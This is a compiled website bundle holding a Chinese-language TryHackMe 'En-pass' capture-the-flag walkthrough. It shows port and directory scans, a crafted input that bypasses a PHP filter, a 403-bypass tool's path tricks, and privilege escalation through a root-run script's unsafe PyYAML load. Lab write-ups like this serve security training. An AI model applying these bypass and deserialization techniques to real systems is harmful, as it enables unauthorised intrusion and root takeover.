"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8353],{69629:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>p,contentTitle:()=>r,default:()=>h,frontMatter:()=>i,metadata:()=>l,toc:()=>o});var t=s(74848),a=s(28453);const i={sidebar_position:141,tags:["Easy","Linux","\u4ee3\u7801\u5ba1\u8ba1","Bypass-","\u5b9a\u65f6\u4efb\u52a1"],title:"En-pass",description:"En-pass",sidebar_label:"En-pass",slug:"/tryhackme/141"},r="En-pass",l={id:"box/TryHackMe/141",title:"En-pass",description:"En-pass",source:"@site/docs/box/TryHackMe/141.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/141",permalink:"/docs/tryhackme/141",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u4ee3\u7801\u5ba1\u8ba1",permalink:"/docs/tags/\u4ee3\u7801\u5ba1\u8ba1"},{label:"Bypass-",permalink:"/docs/tags/bypass"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"}],version:"current",sidebarPosition:141,frontMatter:{sidebar_position:141,tags:["Easy","Linux","\u4ee3\u7801\u5ba1\u8ba1","Bypass-","\u5b9a\u65f6\u4efb\u52a1"],title:"En-pass",description:"En-pass",sidebar_label:"En-pass",slug:"/tryhackme/141"},sidebar:"boxSidebar",previous:{title:"Brute",permalink:"/docs/tryhackme/140"},next:{title:"SafeZone",permalink:"/docs/tryhackme/142"}},p={},o=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"imsau",id:"imsau",level:3},{value:"imsau \u2014&gt; root",id:"imsau--root",level:3}];function c(n){const e={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,a.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h1,{id:"en-pass",children:"En-pass"}),"\n",(0,t.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-182-177:~/enpass# nmap -sTCV -p 22,8001 --min-rate 1000 10.10.52.141\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-04 11:40 BST\nNmap scan report for ip-10-10-52-141.eu-west-1.compute.internal (10.10.52.141)\nHost is up (0.00010s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA)\n|   256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA)\n|_  256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (EdDSA)\n8001/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: En-Pass\nMAC Address: 02:17:CA:F8:27:BB (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,t.jsx)(e.h2,{id:"80",children:"80"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-182-177:~/enpass# gobuster dir -u http://10.10.52.141:8001/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.52.141:8001/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/10/04 11:41:24 Starting gobuster\n===============================================================\n/web (Status: 301)     # \u6ca1\u6709\u6743\u9650\u8bbf\u95ee\n/index.html (Status: 200)\n/reg.php (Status: 200)\n/403.php (Status: 403)\n/zip (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2023/10/04 11:49:03 Finished\n===============================================================\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u8bbf\u95ee reg.php \u9875\u9762\u6211\u53d1\u73b0\u5176\u6e90\u4ee3\u7801\u4e2d\u6cc4\u9732\u4e86\u540e\u7aef\u4ee3\u7801"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-php",children:'<?php\nif($_SERVER["REQUEST_METHOD"] == "POST"){\n   $title = $_POST["title"];\n   if (!preg_match(\'/[a-zA-Z0-9]/i\' , $title )){\n          $val = explode(",",$title);\n          $sum = 0;\n          for($i = 0 ; $i < 9; $i++){\n                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {\n                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) \n                        $sum = $sum+ (bool)$val[$i]."<br>"; \n                }\n          }\n          if ( ($sum) == 9 ){\n              echo $result;//do not worry you\'ll get what you need.\n              echo " Congo You Got It !! Nice ";\n            }\n                    else{\n                      echo "  Try Try!!";\n                    }\n          }\n          else{\n            echo "  Try Again!! ";\n          }    \n  }\n?>\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u5bf9\u4e0a\u8ff0\u4ee3\u7801\u8be2\u95ee GPT \u5e76\u8fdb\u884c\u7b80\u5355\u5206\u6790\u540e\u521b\u5efa\u51fa\u4e86\u5982\u4e0b pyload"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"!@,#$,%^,&,*,(,),-,+-*\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5f53\u6211\u4eec\u8f93\u5165\u4e4b\u540e\u544a\u8bc9\u6211\u4eec\u4e00\u4e2a\u5bc6\u7801, \u6211\u731c\u6d4b\u8fd9\u4e2a\u5bc6\u7801\u53ef\u80fd\u662f\u67d0\u4e2a\u8d26\u53f7\u6216\u8005\u4e00\u4e9b\u6587\u4ef6\u7684\u5bc6\u7801"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-171921.png",alt:"image-20240709171920123"})}),"\n",(0,t.jsx)(e.p,{children:"\u56e0\u4e3a\u4e4b\u524d\u76ee\u5f55\u626b\u63cf\u7684\u65f6\u5019\u5bf9\u4e8e web \u76ee\u5f55\u6ca1\u6709\u6743\u9650\u8bbf\u95ee, \u6240\u4ee5\u6211\u6df1\u5165\u626b\u63cf\u53d1\u73b0\u4e86\u4e00\u4e2a\u6587\u4ef6, \u8bbf\u95ee\u65b0\u53d1\u73b0\u7684\u6587\u4ef6, \u6211\u83b7\u53d6\u5230\u4e86\u4e00\u4e2a SSH"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-171929.png",alt:"image-20240709171927356"})}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"\u6240\u4ee5\u6211\u731c\u6d4b\u4e4b\u524d\u5f97\u5230\u7684\u5bc6\u7801\u5176\u5b9e\u5c31\u662f SSH \u79c1\u94a5\u7684\u5bc6\u7801, \u8fdb\u884c\u9a8c\u8bc1"}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-171935.png",alt:"image-20240709171934184"})}),"\n",(0,t.jsxs)(e.p,{children:["\u73b0\u5728\u6211\u4eec\u6709\u4e86 SSH \u7684\u79c1\u94a5\u4f46\u662f\u6ca1\u6709\u7528\u6237\u540d, \u6b64\u65f6\u6211\u5c06\u76ee\u5f55\u653e\u5230\u4e86 zip \u76ee\u5f55\u4e0b, \u5176\u4e0b\u5b58\u5728\u5f88\u591a\u538b\u7f29\u6587\u4ef6, \u6211\u672c\u6765\u60f3\u7684\u662f\u5176\u4e2d\u5e94\u8be5\u6709\u4e00\u4e9b\u9690\u85cf\u6587\u4ef6, \u7ed3\u679c\u91cc\u9762\u5168\u90e8\u90fd\u662f\u4e00\u4e2a\u5355\u8bcd sadman \u53ea\u80fd\u53e6\u5bfb\u4ed6\u6cd5, \u770b\u4e86\u63d0\u793a\u540e\u544a\u8bc9\u6211\u4eec\u9700\u8981\u7ed5\u8fc7 403 \u8fd9\u91cc\u7684 403 \u53ea\u6709\u4e00\u4e2a\u90a3\u5c31\u662f 403.php \u6587\u4ef6, \u6240\u4ee5\u6211\u5bfb\u627e\u4e86\u4e00\u4e9b\u5de5\u5177\u6765\u5e2e\u52a9\u8fdb\u884c\u64cd\u4f5c ",(0,t.jsx)(e.a,{href:"https://github.com/iamj0ker/bypass-403",children:"Bypass-403"})]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-182-177:~/enpass/bypass-403# ./bypass-403.sh http://10.10.52.141:8001/403.php\n ____                                  _  _    ___ _____ \n| __ ) _   _ _ __   __ _ ___ ___      | || |  / _ \\___ / \n|  _ \\| | | | '_ \\ / _` / __/ __|_____| || |_| | | ||_ \\ \n| |_) | |_| | |_) | (_| \\__ \\__ \\_____|__   _| |_| |__) |\n|____/ \\__, | .__/ \\__,_|___/___/        |_|  \\___/____/ \n       |___/|_|                                          \n                                               By Iam_J0ker\n./bypass-403.sh https://example.com path\n \n.......\n403,1123  --\x3e http://10.10.52.141:8001/403.php/ -H X-Host: 127.0.0.1\n200,917  --\x3e http://10.10.52.141:8001/403.php/..;/\n000,0  --\x3e http://10.10.52.141:8001/403.php/;/\n.....\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5728\u8f93\u51fa\u4e2d\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a 200 , \u8bbf\u95ee\u5b83\u53d1\u73b0\u4e00\u4e2a\u5355\u8bcd\u4f30\u8ba1\u5c31\u662f\u6211\u4eec\u7684\u7528\u6237"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-172007.png",alt:"image-20240709172005967"})}),"\n",(0,t.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(e.h3,{id:"imsau",children:"imsau"}),"\n",(0,t.jsx)(e.p,{children:"\u5229\u7528\u5f97\u5230\u7684\u5bc6\u94a5\u8fdb\u884c\u767b\u9646"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-172023.png",alt:"image-20240709172021644"})}),"\n",(0,t.jsx)(e.h3,{id:"imsau--root",children:"imsau \u2014> root"}),"\n",(0,t.jsx)(e.p,{children:"\u5728\u7cfb\u7edf\u4e2d\u641c\u5bfb\u65f6, \u6211\u53d1\u73b0 opt \u4e0b\u6709\u4e00\u4e2a\u5c5e\u4e8e root \u7684 scripts \u6587\u4ef6\u5e76\u4e14\u5176\u4e2d\u5b58\u5728\u4e00\u4e2a py \u811a\u672c, \u56e0\u6b64\u6211\u731c\u6d4b\u6709\u5b9a\u65f6\u4efb\u52a1"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:'imsau@enpass:/opt/scripts$ ls -al\ntotal 12\ndrwxr-xr-x 2 root root 4096 Jan 31  2021 .\ndrwxr-xr-x 3 root root 4096 Jan 31  2021 ..\n-r-xr-xr-x 1 root root  250 Jan 31  2021 file.py\nimsau@enpass:/opt/scripts$ cat file.py \n#!/usr/bin/python\nimport yaml\n\nclass Execute():\n\tdef __init__(self,file_name ="/tmp/file.yml"):\n\t\tself.file_name = file_name\n\t\tself.read_file = open(file_name ,"r")\n\n\tdef run(self):\n\t\treturn self.read_file.read()\n\ndata  = yaml.load(Execute().run())\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u4e0a\u4f20 pspy \u76f4\u63a5\u76d1\u89c6\u53d1\u73b0\u786e\u5b9e\u5b58\u5728 root \u8fdb\u7a0b, \u5e76\u4e14\u5176\u4f1a\u5c06 /tmp/file.yml \u6587\u4ef6\u5220\u9664"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-172033.png",alt:"image-20240709172032020"})}),"\n",(0,t.jsx)(e.p,{children:"\u5c06\u4ee3\u7801\u4ea4\u7ed9 GPT \u540e, \u5176\u544a\u8bc9\u6211\u5bf9\u4e8e PyYAML < 5.1 \u7684\u7248\u672c yaml.load() \u662f\u5b58\u5728\u6f0f\u6d1e\u7684, \u63a5\u7740\u6211\u67e5\u770b\u4e86\u672c\u5730\u7684\u7248\u672c"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-172038.png",alt:"image-20240709172037244"})}),"\n",(0,t.jsxs)(e.p,{children:["\u56e0\u6b64\u6211\u5f00\u59cb\u4e86\u8c37\u6b4c\u5bfb\u627e\u53d1\u73b0\u4e00\u4e2a\u5229\u7528\u7684\u811a\u672c ",(0,t.jsx)(e.a,{href:"https://github.com/j0lt-github/python-deserialization-attack-payload-generator",children:"python-deserialization-attack-payload-generator"})]}),"\n",(0,t.jsx)(e.p,{children:"\u76f4\u63a5\u751f\u6210\u5229\u7528\u7136\u540e\u4e0a\u4f20\u5230\u76ee\u6807\u7aef"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-172048.png",alt:"image-20240709172046377"})}),"\n",(0,t.jsx)(e.p,{children:"\u5176\u5b9e\u6211\u4eec\u53ea\u8981\u7b49\u5f85\u7247\u523b, \u53ea\u6709 tmp \u76ee\u5f55\u4e0b\u7684 file.yml \u6587\u4ef6\u4e00\u6d88\u5931\u6211\u4eec\u5c31\u53ef\u4ee5\u5224\u5b9a\u6267\u884c\u6210\u529f"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-172054.png",alt:"image-20240709172052402"})})]})}function h(n={}){const{wrapper:e}={...(0,a.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(c,{...n})}):c(n)}},28453:(n,e,s)=>{s.d(e,{R:()=>r,x:()=>l});var t=s(96540);const a={},i=t.createContext(a);function r(n){const e=t.useContext(i);return t.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:r(n.components),t.createElement(i.Provider,{value:e},n.children)}}}]);